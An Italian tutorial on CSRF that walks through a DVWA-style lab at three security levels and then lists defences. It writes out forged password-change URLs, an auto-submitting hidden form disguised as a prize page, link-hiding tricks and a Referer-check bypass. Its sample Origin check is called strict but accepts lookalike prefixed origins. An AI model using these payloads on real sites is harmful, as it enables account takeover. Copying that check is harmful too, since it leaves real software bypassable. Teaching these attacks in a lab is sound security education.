🎭 Cross-Site Request Forgery (CSRF)

Forzare gli utenti autenticati a eseguire azioni indesiderate senza la loro consapevolezza

📖 Cos'è un Attacco CSRF?

Definizione

Il Cross-Site Request Forgery (CSRF) è un attacco che inganna la vittima facendole eseguire azioni non volute su un'applicazione web in cui è attualmente autenticata. L'attaccante sfrutta la fiducia che il sito ha nel browser dell'utente.

A differenza del XSS che sfrutta la fiducia dell'utente nel sito, il CSRF sfrutta la fiducia del sito nell'utente (più precisamente, nella sua sessione).

Come Funziona?

1

Vittima Autenticata

L'utente è loggato su un sito vulnerabile

2

Richiesta Malevola

L'attaccante crea un link o form malevolo

3

Esecuzione

La vittima clicca/visita, eseguendo l'azione

Esempio Pratico:

Immagina di essere loggato alla tua banca online. Un attaccante ti invia una email con un link che sembra innocuo. Cliccando sul link (mentre sei ancora autenticato), viene effettuato un bonifico dal tuo conto a quello dell'attaccante, senza che tu ne sia consapevole.

Condizioni per un Attacco CSRF di Successo

  • Azione di valore: Deve esserci un'azione che l'attaccante vuole eseguire (cambio password, trasferimento fondi, modifica email)
  • Gestione sessione basata su cookie: L'applicazione identifica l'utente solo tramite cookie di sessione
  • Nessun parametro imprevedibile: La richiesta non contiene parametri che l'attaccante non può determinare
  • Vittima autenticata: L'utente deve avere una sessione attiva

Low Security Vulnerabilità e Sfruttamento

⚠️ Vulnerabilità: L'applicazione gestisce la modifica della password tramite richieste GET con parametri visibili nell'URL, senza alcuna protezione anti-CSRF.

URL Vulnerabile:

http://127.0.0.1:42001/vulnerabilities/csrf/?password_new=admin&password_conf=admin&Change=Change

Quando un utente cambia la password, tutti i parametri sono nell'URL. Un attaccante può semplicemente modificare questi parametri e inviare il link alla vittima.

🎯 Attacco Base

Procedura:

  1. L'attaccante crea un URL malevolo modificando i parametri: 
    http://127.0.0.1:42001/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change
  2. L'attaccante invia questo URL alla vittima (via email, chat, social media)
  3. Se la vittima è autenticata e clicca sul link, la sua password viene cambiata a hacked123
  4. L'attaccante può ora accedere con le nuove credenziali

💡 Perché Funziona:

Il browser della vittima include automaticamente il cookie di sessione (PHPSESSID) con la richiesta GET. Il server vede una richiesta autenticata valida e procede con il cambio password, senza verificare se la richiesta proviene realmente dalla vittima.

🎯 Attacco Avanzato: URL Encoding

Per rendere l'URL meno sospetto, l'attaccante può codificarlo:

Utilizzo di Burp Suite Decoder:

  1. Aprire Burp Suite → Decoder
  2. Incollare l'URL malevolo
  3. Applicare encoding (URL, Base64, etc.)
  4. O nascondere in un servizio di URL shortening (bit.ly, tinyurl)
# URL Originale
http://victim.com/csrf/?password_new=hacked&password_conf=hacked&Change=Change

# URL Accorciato (esempio)
https://bit.ly/3xAbCdE

🎯 Attacco con Form HTML Nascosto

Un metodo ancora più insidioso è creare una pagina HTML con form auto-submit:

<html>
<body>
  <h1>Clicca qui per vincere un premio!</h1>
  <form action="http://victim.com/vulnerabilities/csrf/" method="GET" id="csrfForm">
    <input type="hidden" name="password_new" value="hacked123" />
    <input type="hidden" name="password_conf" value="hacked123" />
    <input type="hidden" name="Change" value="Change" />
  </form>
  <script>
    document.getElementById('csrfForm').submit();
  </script>
</body>
</html>

💡 Come Funziona:

Quando la vittima visita questa pagina, il form viene automaticamente inviato tramite JavaScript. La vittima vede solo "Clicca qui per vincere un premio!" mentre la sua password viene cambiata in background.

Medium Security Protezioni Implementate

🛡️ Nuova Difesa: Il server verifica l'header Referer della richiesta HTTP per assicurarsi che provenga dallo stesso dominio del server.

Logica di Validazione (Concettuale):

if (isset($_SERVER['HTTP_REFERER'])) {
    $referer = $_SERVER['HTTP_REFERER'];
    if (strpos($referer, $_SERVER['SERVER_NAME']) === false) {
        die("CSRF Attack Detected!");
    }
    // Procedi con il cambio password
}

Il codice controlla se l'header Referer contiene il nome del server. Se la richiesta proviene da un dominio esterno, viene bloccata.

🎯 Bypass: Manipolazione Header Referer

Metodo con Burp Suite:

  1. Configurare Burp Suite per intercettare il traffico HTTP
  2. Inviare una richiesta malevola che verrà bloccata
  3. Intercettare la richiesta con Burp Suite
  4. Modificare o aggiungere l'header Referer per includere il nome del server vittima: 
    Referer: http://victim-server.com/malicious-page.html
  5. Inoltrare la richiesta modificata

💡 Perché il Bypass Funziona:

La validazione cerca solo se il nome del server è contenuto nell'header Referer, non se il Referer inizia con il dominio del server. Questo permette bypass come: 

Referer: http://attacker.com/victim-server.com/fake.html

Problema fondamentale: L'header Referer può essere manipolato dal client e non dovrebbe mai essere usato come unica difesa anti-CSRF.

High Security Protezioni Avanzate

🛡️ Difese Implementate:
  • Metodo POST invece di GET per il cambio password
  • Token Anti-CSRF univoco generato per ogni richiesta
  • Validazione del token lato server prima di eseguire l'azione

Come Funziona il Token Anti-CSRF:

  1. Il server genera un token casuale e lo memorizza nella sessione utente
  2. Il token viene incluso come campo nascosto nel form HTML
  3. Quando il form viene inviato, il server valida che il token ricevuto corrisponda a quello in sessione
  4. Se il token è assente, errato o scaduto, la richiesta viene rifiutata

Implementazione (Concettuale):

<!-- Nel form HTML -->
<input type="hidden" name="user_token" value="" />

<!-- Nella logica server -->
if ($_POST['user_token'] !== $_SESSION['csrf_token']) {
    die("Invalid CSRF token!");
}
// Procedi con il cambio password

🎯 Analisi dell'Attacco (Non Bypassabile)

Perché è Difficile Bypassare:

  • Il token è imprevedibile: generato casualmente per ogni sessione
  • Il token è unico: diverso per ogni utente e ogni richiesta
  • Il token è validato lato server: non può essere manipolato dal client
  • L'attaccante non può conoscere il token della vittima senza accesso alla sua sessione

💡 Possibile Vettore di Attacco (Teorico):

L'unico modo per bypassare il token anti-CSRF sarebbe:

  1. XSS: Sfruttare una vulnerabilità XSS per rubare il token dalla pagina
  2. Session Hijacking: Rubare il cookie di sessione della vittima
  3. Man-in-the-Middle: Intercettare il traffico non cifrato (HTTP invece di HTTPS)
  4. Social Engineering: Ingannare la vittima a rivelare il token

Conclusione: Con implementazione corretta e HTTPS, i token anti-CSRF forniscono protezione robusta contro gli attacchi CSRF.

🛡️ Strategie di Mitigazione

1. Token Anti-CSRF (Raccomandato)

  • Synchronizer Token Pattern: Token univoco per sessione/richiesta
  • Double Submit Cookie: Inviare il token sia nel cookie che nel form
  • Encrypted Token Pattern: Token crittografati con chiave server
  • Per-Request Tokens: Generare nuovo token ad ogni richiesta (più sicuro ma più complesso)

Implementazione Best Practices:

// Generazione token sicuro (PHP)
$token = bin2hex(random_bytes(32));
$_SESSION['csrf_token'] = $token;

// Validazione
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    die('CSRF token validation failed');
}

2. Attributo SameSite per Cookie

  • SameSite=Strict: Cookie inviato solo per richieste same-site
  • SameSite=Lax: Cookie inviato per navigazione top-level
  • SameSite=None: Cookie inviato sempre (richiede Secure flag)
Set-Cookie: SESSIONID=abc123; SameSite=Strict; Secure; HttpOnly

Nota: SameSite=Strict blocca l'invio dei cookie per richieste cross-site, prevenendo molti attacchi CSRF automaticamente.

3. Verifica Header Origin e Referer

  • Origin header: Più affidabile del Referer, verifica l'origine della richiesta
  • Strict validation: Controllare che Origin/Referer inizi con il dominio corretto
  • Fallback: Usare come difesa aggiuntiva, non primaria
// Validazione Origin header
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
$allowedOrigin = 'https://myapp.com';
if (strpos($origin, $allowedOrigin) !== 0) {
    die('Invalid origin');
}

4. Usare Metodi HTTP Appropriati

  • GET: Solo per lettura, mai per azioni che modificano stato
  • POST/PUT/DELETE: Per azioni che cambiano dati
  • Idempotenza: Progettare API per essere sicure anche con rigiochi

Regola: Se l'azione cambia stato (crea, modifica, elimina), DEVE usare POST/PUT/DELETE, MAI GET.

5. Re-autenticazione per Azioni Sensibili

  • Richiedere la password corrente per cambio password
  • Richiedere conferma via email per azioni critiche
  • Implementare step-up authentication per operazioni ad alto rischio

6. Framework e Librerie

  • Usare framework moderni: Laravel, Django, Rails hanno protezione CSRF integrata
  • Middleware CSRF: Abilitare middleware anti-CSRF del framework
  • Non reinventare la ruota: Usare implementazioni testate e sicure

7. Content Security Policy (CSP)

  • Limitare domani da cui possono essere caricati script
  • Prevenire inline script che potrebbero facilitare CSRF
  • Usare nonce o hash per script legittimi
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'

📌 Riepilogo

Il CSRF sfrutta la fiducia che un'applicazione web ha nei browser autenticati per eseguire azioni non autorizzate. La difesa più efficace è l'uso di token anti-CSRF combinato con cookie SameSite, validazione Origin/Referer, e uso corretto dei metodi HTTP.

Chiave di volta: Mai fidarsi ciecamente delle richieste autenticate. Implementare token imprevedibili per validare l'intento dell'utente.
